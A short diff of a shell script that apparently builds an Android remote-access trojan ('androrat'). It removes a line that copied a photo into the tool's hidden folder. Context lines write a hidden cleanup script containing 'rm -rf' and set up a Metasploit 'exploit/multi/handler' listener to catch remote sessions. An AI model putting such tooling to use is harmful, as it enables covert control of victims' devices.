@@ -39,7 +39,6 @@ echo "rm -rf "$apn".apk" >> .1.sh
 tput setaf 5; echo " "
 read -p 'SET  PHOTO PATH' photo
 mv "$photo" image.jpeg
-cp -r "$photo" $HOME/androrat/.files
 #finish
 #Listner
 echo "use exploit/multi/handler" > .d.rc
